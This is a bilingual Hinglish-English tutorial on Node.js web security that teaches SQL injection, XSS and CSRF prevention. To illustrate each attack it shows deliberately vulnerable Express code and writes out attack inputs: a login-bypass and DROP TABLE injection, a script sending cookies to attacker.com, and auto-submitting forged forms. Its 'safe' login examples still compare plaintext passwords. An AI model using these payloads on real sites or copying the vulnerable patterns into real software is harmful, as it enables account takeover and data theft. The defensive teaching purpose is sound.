# SECURITY BEST PRACTICES

--------------------------------

## A) Hinglish Theory

### Zero se Start Karte Hain

**Security Best Practices kya hain?**
- Security ke liye recommended practices
- Common vulnerabilities se protect karna
- Security standards follow karna
- Defense in depth approach
- Continuous security improvement

**Key Areas:**
- Authentication & Authorization
- Input Validation & Sanitization
- Secure Communication (HTTPS)
- Error Handling
- Dependency Management
- Secrets Management

### Common Vulnerabilities

**1. SQL Injection:**
- Malicious SQL code injection
- Parameterized queries use karo
- ORM use karo

**2. XSS (Cross-Site Scripting):**
- Malicious scripts injection
- Input sanitization
- Output encoding

**3. CSRF (Cross-Site Request Forgery):**
- Unauthorized actions
- CSRF tokens
- SameSite cookies

**4. Authentication Issues:**
- Weak passwords
- Session hijacking
- Token security

**5. Sensitive Data Exposure:**
- Plain passwords
- API keys in code
- Proper encryption

---

## B) Easy English Theory

### What are Security Best Practices?

Security Best Practices are recommended approaches to protect applications from common vulnerabilities. Key areas include authentication, input validation, secure communication, error handling, and secrets management.

### Common Vulnerabilities

**SQL Injection:** Inject malicious SQL - use parameterized queries
**XSS:** Inject malicious scripts - sanitize input, encode output
**CSRF:** Unauthorized actions - use CSRF tokens
**Authentication:** Weak passwords, session issues - strong auth
**Data Exposure:** Sensitive data leaked - proper encryption

---

## C) Why This Concept Exists

### The Problem

**Without Security Practices:**
- Vulnerable to attacks
- Data breaches
- User accounts compromised
- Reputation damage
- Legal issues

### The Solution

**Best Practices Provide:**
1. **Protection:** Against common attacks
2. **Compliance:** Security standards
3. **Trust:** User confidence
4. **Prevention:** Proactive security
5. **Defense:** Multiple layers

---

## D) Practical Example (Code)

```javascript
// ============================================
// HELMET.JS - SECURITY HEADERS
// ============================================

const helmet = require('helmet');
app.use(helmet());

// Sets various HTTP headers for security:
// - Content-Security-Policy
// - X-Frame-Options
// - X-Content-Type-Options
// - Strict-Transport-Security
// etc.

// ============================================
// CORS CONFIGURATION
// ============================================

const cors = require('cors');

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS.split(','),
  credentials: true,
  optionsSuccessStatus: 200
}));

// ============================================
// INPUT VALIDATION
// ============================================

const { body, validationResult } = require('express-validator');

app.post('/users', [
  body('email').isEmail().normalizeEmail(),
  body('name').trim().escape(),
  body('age').isInt({ min: 0, max: 120 })
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process validated data
});

// ============================================
// SQL INJECTION - DETAILED EXPLANATION
// ============================================

/**
 * SQL INJECTION KYA HAI? (HINGLISH)
 * 
 * SQL Injection ek bahut dangerous attack hai jisme attacker malicious SQL code
 * inject karta hai application ke database queries mein.
 * 
 * Simple Definition:
 * - Attacker user input mein SQL commands daal deta hai
 * - Application directly user input ko SQL query mein use karta hai
 * - Database execute ho jata hai attacker ka malicious SQL
 * - Result: Data leak, data delete, unauthorized access
 * 
 * Real-life Analogy:
 * 1. Fake ID:
 *    - Jaise aap security guard ko fake ID dikha kar building mein ghus jate ho
 *    - SQL Injection bhi waise hi - fake SQL commands se database access
 * 
 * 2. Poisoned Food:
 *    - Normal food mein poison mix karna
 *    - Normal user input mein malicious SQL mix karna
 * 
 * HOW SQL INJECTION WORKS (Attack Example):
 * 
 * ❌ VULNERABLE CODE:
 */
app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  
  // ❌ DANGEROUS - Direct string concatenation
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
  
  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  });
});

/**
 * ATTACK SCENARIO:
 * 
 * Normal Input:
 * - email: "user@example.com"
 * - password: "mypassword123"
 * - Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = 'mypassword123'
 * - Result: Works fine ✅
 * 
 * Malicious Input (SQL Injection):
 * - email: "user@example.com"
 * - password: "' OR '1'='1"
 * - Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = '' OR '1'='1'
 * - Result: '1'='1' always true, so attacker login ho jata hai! ❌
 * 
 * More Dangerous Attack:
 * - email: "admin@example.com'; DROP TABLE users; --"
 * - Query: SELECT * FROM users WHERE email = 'admin@example.com'; DROP TABLE users; --'
 * - Result: Entire users table delete ho jayega! ❌❌❌
 * 
 * HOW TO PREVENT SQL INJECTION:
 * 
 * ✅ SOLUTION 1: Parameterized Queries (Prepared Statements)
 */
app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  
  // ✅ SAFE - Parameterized query
  const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
  
  // Database treats ? as placeholder, not as part of SQL code
  // Even if attacker sends: email = "admin'; DROP TABLE users; --"
  // It will be treated as a STRING VALUE, not SQL command
  db.query(query, [email, password], (err, results) => {
    if (results.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  });
});

/**
 * ✅ SOLUTION 2: Using ORM (Object-Relational Mapping)
 */
// Using Mongoose (MongoDB)
const User = require('./models/User');

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // ✅ SAFE - ORM automatically handles parameterization
  const user = await User.findOne({ email, password });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// Using Sequelize (SQL databases)
const { User } = require('./models');

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // ✅ SAFE - Sequelize uses parameterized queries internally
  const user = await User.findOne({
    where: { email, password }
  });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

/**
 * ✅ SOLUTION 3: Input Validation & Whitelisting
 */
const validator = require('validator');

app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  
  // ✅ Validate input format
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }
  
  // ✅ Whitelist allowed characters
  if (!/^[a-zA-Z0-9@._-]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid characters' });
  }
  
  // Then use parameterized query
  const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
  db.query(query, [email, password], (err, results) => {
    // Safe
  });
});

/**
 * SQL INJECTION - ENGLISH EXPLANATION
 * 
 * SQL Injection is a code injection technique where an attacker inserts malicious
 * SQL statements into an application's database query.
 * 
 * How It Works:
 * 1. Attacker provides malicious input in user fields
 * 2. Application directly concatenates input into SQL query
 * 3. Database executes the malicious SQL
 * 4. Attacker gains unauthorized access or damages data
 * 
 * Prevention Methods:
 * 1. Parameterized Queries: Use placeholders (?) instead of string concatenation
 * 2. ORM: Use Object-Relational Mapping libraries (Mongoose, Sequelize)
 * 3. Input Validation: Validate and sanitize all user input
 * 4. Least Privilege: Database user should have minimum required permissions
 * 5. Stored Procedures: Use stored procedures with parameters
 */

// ============================================
// XSS (CROSS-SITE SCRIPTING) - DETAILED EXPLANATION
// ============================================

/**
 * XSS (CROSS-SITE SCRIPTING) KYA HAI? (HINGLISH)
 * 
 * XSS ek attack hai jisme attacker malicious JavaScript code inject karta hai
 * web pages mein. Jab user woh page open karta hai, to malicious script execute
 * ho jata hai user ke browser mein.
 * 
 * Simple Definition:
 * - Attacker user input mein JavaScript code daal deta hai
 * - Application directly user input ko page mein render karta hai
 * - Browser malicious script ko execute kar deta hai
 * - Result: Cookie theft, session hijacking, data theft
 * 
 * Real-life Analogy:
 * 1. Poisoned Letter:
 *    - Jaise ek letter mein poison powder hidden ho
 *    - XSS bhi waise hi - normal text mein hidden malicious script
 * 
 * 2. Trojan Horse:
 *    - Bahar se normal dikhta hai, andar se dangerous
 *    - Normal user input dikhta hai, andar malicious code
 * 
 * TYPES OF XSS:
 * 
 * 1. STORED XSS (Persistent):
 *    - Malicious script database mein store ho jata hai
 *    - Har user jo page open karega, script execute hoga
 *    - Example: Comment section mein script daalna
 * 
 * 2. REFLECTED XSS (Non-Persistent):
 *    - Malicious script URL ya form input mein hota hai
 *    - Script immediately reflect hota hai response mein
 *    - Example: Search query mein script
 * 
 * 3. DOM-BASED XSS:
 *    - Client-side JavaScript vulnerable hota hai
 *    - Script DOM manipulate karta hai
 *    - Example: location.hash, document.write
 * 
 * HOW XSS WORKS (Attack Example):
 * 
 * ❌ VULNERABLE CODE:
 */
app.get('/search', (req, res) => {
  const query = req.query.q; // User input
  
  // ❌ DANGEROUS - Direct rendering without sanitization
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>No results found.</p>
      </body>
    </html>
  `);
});

/**
 * ATTACK SCENARIO:
 * 
 * Normal Input:
 * - URL: /search?q=javascript
 * - Output: "Search Results for: javascript"
 * - Result: Works fine ✅
 * 
 * Malicious Input (XSS Attack):
 * - URL: /search?q=<script>alert('XSS')</script>
 * - Output: "Search Results for: <script>alert('XSS')</script>"
 * - Result: Script execute ho jayega, alert show hoga! ❌
 * 
 * More Dangerous Attack:
 * - URL: /search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
 * - Result: User ka cookie attacker ko bhej diya jayega! ❌❌❌
 * 
 * Stored XSS Example (Comment Section):
 */
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // ❌ DANGEROUS - Store without sanitization
  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
    res.json({ success: true });
  });
});

app.get('/comments', (req, res) => {
  db.query('SELECT * FROM comments', (err, results) => {
    // ❌ DANGEROUS - Render without escaping
    const html = results.map(c => `<p>${c.text}</p>`).join('');
    res.send(html);
  });
});

/**
 * Attack:
 * - Comment: "<script>alert('XSS')</script>"
 * - Result: Har user jo comments page open karega, script execute hoga
 * 
 * HOW TO PREVENT XSS:
 * 
 * ✅ SOLUTION 1: Output Encoding (HTML Escaping)
 */
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // ✅ SAFE - Escape HTML special characters
  const safeQuery = escapeHtml(query);
  
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${safeQuery}</h1>
        <p>No results found.</p>
      </body>
    </html>
  `);
});

/**
 * ✅ SOLUTION 2: Using Template Engines with Auto-Escaping
 */
// Using EJS with auto-escaping
app.set('view engine', 'ejs');

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // ✅ SAFE - EJS automatically escapes variables
  res.render('search', { query: query });
});

// search.ejs file:
// <h1>Search Results for: <%= query %></h1>  <!-- Auto-escaped -->

/**
 * ✅ SOLUTION 3: DOMPurify (For HTML Content)
 */
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/comment', (req, res) => {
  let comment = req.body.comment;
  
  // ✅ SAFE - Sanitize HTML, allow only safe tags
  comment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
    res.json({ success: true });
  });
});

/**
 * ✅ SOLUTION 4: Content Security Policy (CSP)
 */
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // Only allow scripts from same origin
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  }
}));

/**
 * ✅ SOLUTION 5: Input Validation & Sanitization
 */
const validator = require('validator');
const xss = require('xss');

app.post('/comment', (req, res) => {
  let comment = req.body.comment;
  
  // ✅ Validate length
  if (comment.length > 1000) {
    return res.status(400).json({ error: 'Comment too long' });
  }
  
  // ✅ Sanitize XSS
  comment = xss(comment, {
    whiteList: {}, // No HTML tags allowed
    stripIgnoreTag: true,
    stripIgnoreTagBody: ['script']
  });
  
  // ✅ Trim whitespace
  comment = comment.trim();
  
  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
    res.json({ success: true });
  });
});

/**
 * XSS - ENGLISH EXPLANATION
 * 
 * Cross-Site Scripting (XSS) is a security vulnerability where attackers inject
 * malicious scripts into web pages viewed by other users.
 * 
 * How It Works:
 * 1. Attacker injects malicious JavaScript in user input
 * 2. Application renders input without sanitization
 * 3. Browser executes malicious script in user's context
 * 4. Attacker can steal cookies, sessions, or perform actions on user's behalf
 * 
 * Prevention Methods:
 * 1. Output Encoding: Escape HTML special characters (<, >, &, ", ')
 * 2. Input Sanitization: Remove or encode dangerous characters
 * 3. Content Security Policy: Restrict script execution sources
 * 4. Template Engines: Use engines with auto-escaping (EJS, Handlebars)
 * 5. DOMPurify: Sanitize HTML content, allow only safe tags
 * 6. Input Validation: Validate format, length, and content
 */

// ============================================
// CSRF (CROSS-SITE REQUEST FORGERY) - DETAILED EXPLANATION
// ============================================

/**
 * CSRF (CROSS-SITE REQUEST FORGERY) KYA HAI? (HINGLISH)
 * 
 * CSRF ek attack hai jisme attacker user ko bewajah ek malicious website par
 * le jata hai, aur wahan se user ke behalf par legitimate website par
 * unauthorized actions perform karwata hai.
 * 
 * Simple Definition:
 * - User logged in hai legitimate website par
 * - Attacker user ko malicious website par le jata hai
 * - Malicious website automatically legitimate website par request bhej deta hai
 * - Request user ke cookies/session ke saath jata hai
 * - Legitimate website request ko valid samajh kar execute kar deta hai
 * - Result: Unauthorized actions (password change, money transfer, etc.)
 * 
 * Real-life Analogy:
 * 1. Forged Signature:
 *    - Jaise koi aapke signature copy karke document par sign kar deta hai
 *    - CSRF bhi waise hi - attacker aapke session use karke actions perform karta hai
 * 
 * 2. Impersonation:
 *    - Koi aapke uniform pehen kar restricted area mein ghus jata hai
 *    - Attacker aapke session cookies use karke authenticated requests bhejta hai
 * 
 * HOW CSRF WORKS (Attack Example):
 * 
 * ❌ VULNERABLE CODE:
 */
app.post('/change-password', (req, res) => {
  // ❌ DANGEROUS - No CSRF protection
  const { newPassword } = req.body;
  
  // User is authenticated (has valid session)
  const userId = req.session.userId;
  
  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
    res.json({ success: true });
  });
});

/**
 * ATTACK SCENARIO:
 * 
 * Step 1: User logs into legitimate website (example.com)
 * - Session cookie set: sessionId=abc123
 * - User authenticated ✅
 * 
 * Step 2: User visits malicious website (attacker.com)
 * - Attacker's website has this code:
 */
// attacker.com/malicious.html
// <html>
//   <body>
//     <h1>Click here for free money!</h1>
//     <!-- Hidden form that auto-submits -->
//     <form id="evilForm" action="https://example.com/change-password" method="POST">
//       <input type="hidden" name="newPassword" value="hacked123">
//     </form>
//     <script>
//       document.getElementById('evilForm').submit(); // Auto-submit
//     </script>
//   </body>
// </html>

/**
 * Step 3: What Happens:
 * - Browser automatically sends POST request to example.com/change-password
 * - Request includes session cookie (sessionId=abc123) automatically
 * - example.com sees valid session, thinks it's legitimate user
 * - Password changed to "hacked123" without user knowing! ❌❌❌
 * 
 * More Dangerous Attack (Money Transfer):
 */
// attacker.com/steal.html
// <form action="https://bank.com/transfer" method="POST">
//   <input type="hidden" name="toAccount" value="attacker-account">
//   <input type="hidden" name="amount" value="10000">
// </form>
// <script>document.forms[0].submit();</script>

/**
 * HOW TO PREVENT CSRF:
 * 
 * ✅ SOLUTION 1: CSRF Tokens (Most Common)
 */
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true })); // CSRF token in cookie

// Generate form with CSRF token
app.get('/change-password-form', (req, res) => {
  // ✅ Generate unique CSRF token for this session
  const csrfToken = req.csrfToken();
  
  res.render('change-password', { csrfToken: csrfToken });
});

// change-password.ejs:
// <form action="/change-password" method="POST">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   <input type="password" name="newPassword" placeholder="New Password">
//   <button type="submit">Change Password</button>
// </form>

app.post('/change-password', (req, res) => {
  // ✅ CSRF token automatically validated by csurf middleware
  // If token missing or invalid, request rejected
  
  const { newPassword } = req.body;
  const userId = req.session.userId;
  
  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
    res.json({ success: true });
  });
});

/**
 * How CSRF Token Works:
 * 1. Server generates unique token for each session
 * 2. Token sent to client in form (hidden input)
 * 3. Client submits form with token
 * 4. Server validates token matches session token
 * 5. If token invalid/missing, request rejected
 * 6. Attacker can't get valid token (can't access your site's forms)
 * 
 * ✅ SOLUTION 2: SameSite Cookie Attribute
 */
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // No JavaScript access
    sameSite: 'strict' // ✅ CSRF protection
    // 'strict': Cookie never sent in cross-site requests
    // 'lax': Cookie sent only for GET requests (navigation)
    // 'none': Cookie always sent (requires secure: true)
  }
}));

/**
 * SameSite='strict' means:
 * - Cookie only sent with requests from same site
 * - attacker.com se example.com ko request jayegi, but cookie nahi jayega
 * - Without cookie, request unauthenticated, rejected ✅
 * 
 * ✅ SOLUTION 3: Double Submit Cookie Pattern
 */
const crypto = require('crypto');

// Generate CSRF token
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    // Generate random token
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, { httpOnly: false }); // JavaScript accessible
  }
  next();
});

app.post('/change-password', (req, res) => {
  const { newPassword, csrfToken } = req.body;
  const cookieToken = req.cookies.csrfToken;
  
  // ✅ Validate token from body matches token from cookie
  if (!csrfToken || csrfToken !== cookieToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  const userId = req.session.userId;
  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
    res.json({ success: true });
  });
});

/**
 * ✅ SOLUTION 4: Custom Header Validation
 */
app.use((req, res, next) => {
  // Only allow POST/PUT/DELETE requests with custom header
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const customHeader = req.headers['x-requested-with'];
    
    // ✅ Validate custom header exists
    if (!customHeader || customHeader !== 'XMLHttpRequest') {
      return res.status(403).json({ error: 'Invalid request' });
    }
  }
  next();
});

// Frontend must send header:
// fetch('/change-password', {
//   method: 'POST',
//   headers: { 'X-Requested-With': 'XMLHttpRequest' },
//   body: JSON.stringify({ newPassword: 'newpass' })
// });

/**
 * ✅ SOLUTION 5: Referer/Origin Header Validation
 */
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const referer = req.headers.referer;
    const origin = req.headers.origin;
    const allowedOrigin = 'https://example.com';
    
    // ✅ Validate request comes from same origin
    if (!referer || !referer.startsWith(allowedOrigin)) {
      if (!origin || origin !== allowedOrigin) {
        return res.status(403).json({ error: 'Invalid origin' });
      }
    }
  }
  next();
});

/**
 * CSRF - ENGLISH EXPLANATION
 * 
 * Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users
 * to submit requests to a web application where they are currently authenticated.
 * 
 * How It Works:
 * 1. User is logged into legitimate website (has valid session)
 * 2. User visits malicious website
 * 3. Malicious website sends request to legitimate website using user's session
 * 4. Legitimate website sees valid session, executes request
 * 5. Unauthorized action performed without user's knowledge
 * 
 * Prevention Methods:
 * 1. CSRF Tokens: Generate unique token per session, validate on each request
 * 2. SameSite Cookies: Set cookie attribute to 'strict' or 'lax'
 * 3. Double Submit Cookie: Compare token in form with token in cookie
 * 4. Custom Headers: Require custom header that attacker can't set
 * 5. Referer/Origin Validation: Check request comes from same origin
 * 6. Re-authentication: Require password for sensitive actions
 */

// ============================================
// RATE LIMITING
// ============================================

const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});

app.use('/api/', limiter);

// ============================================
// SECURE COOKIES
// ============================================

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: process.env.NODE_ENV === 'production', // HTTPS only
    httpOnly: true, // No JavaScript access
    sameSite: 'strict', // CSRF protection
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

// ============================================
// SECRETS MANAGEMENT
// ============================================

// ❌ WRONG
const apiKey = 'sk_live_12345'; // In code

// ✅ CORRECT
const apiKey = process.env.API_KEY; // From environment

// Use .env file (don't commit!)
// Use secret management services in production

// ============================================
// ERROR HANDLING (No Information Leakage)
// ============================================

app.use((err, req, res, next) => {
  // Log full error
  console.error(err);
  
  // Don't expose details to client
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({
      error: 'Internal server error'
    });
  } else {
    res.status(500).json({
      error: err.message,
      stack: err.stack
    });
  }
});

// ============================================
// DEPENDENCY SECURITY
// ============================================

// Regularly update dependencies
// npm audit
// npm audit fix

// Use Snyk, Dependabot for monitoring

// ============================================
// HTTPS ENFORCEMENT
// ============================================

const express = require('express');
const app = express();

// Redirect HTTP to HTTPS
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
      next();
    }
  });
}
```

---

## E) Internal Working

Security practices work at multiple layers:
- **Input Layer:** Validation, sanitization
- **Application Layer:** Authentication, authorization
- **Data Layer:** Encryption, secure storage
- **Network Layer:** HTTPS, secure headers
- **Infrastructure:** Security monitoring, updates

---

## F) Interview Questions & Answers

### Q1: What are essential security practices for Node.js applications?

**Answer:**
Essential practices: Use Helmet for security headers, validate and sanitize all input, use parameterized queries (prevent SQL injection), implement rate limiting, use HTTPS, secure cookies (httpOnly, secure, sameSite), store secrets in environment variables, keep dependencies updated, implement proper error handling without information leakage, use CSRF protection.

### Q2: How do you prevent SQL Injection?

**Answer:**
Use parameterized queries or prepared statements instead of string concatenation. Use ORMs (Mongoose, Sequelize) which handle this automatically. Never trust user input, always validate and sanitize. Parameterized queries separate SQL code from data, preventing injection.

### Q3: How do you prevent XSS attacks?

**Answer:**
Sanitize all user input, escape output when rendering (use libraries like DOMPurify for HTML), use Content-Security-Policy headers, validate input on server-side, use template engines with auto-escaping. Never render user input directly without sanitization.

---

## G) Common Mistakes

### Mistake 1: Secrets in Code

```javascript
// ❌ WRONG
const apiKey = 'sk_live_12345';

// ✅ CORRECT
const apiKey = process.env.API_KEY;
```

**Why it breaks:** Secrets in code are exposed in version control.

### Mistake 2: No Input Validation

```javascript
// ❌ WRONG
app.post('/users', (req, res) => {
  createUser(req.body); // No validation
});

// ✅ CORRECT
app.post('/users', validateUser, createUser);
```

**Why it breaks:** Malicious input can cause attacks.

---

## H) When to Use & When NOT to Use

All security practices should be used in production applications. Don't skip security even in development - build secure from start.

---

## I) 2-Minute Interview Explanation

**Interviewer:** "Explain Security Best Practices."

**You:**
"Security best practices protect applications from common vulnerabilities. Key practices: Use Helmet for security headers, validate/sanitize all input (prevent XSS, injection), use parameterized queries (prevent SQL injection), implement rate limiting, use HTTPS, secure cookies (httpOnly, secure, sameSite), store secrets in environment variables, keep dependencies updated, proper error handling without information leakage, CSRF protection. Security should be implemented at multiple layers - input, application, data, network."

---

## J) Mini Practice Task

Implement comprehensive security measures: Helmet, input validation, rate limiting, secure cookies, CSRF protection, and proper error handling.

---

**END OF TOPIC: SECURITY BEST PRACTICES**

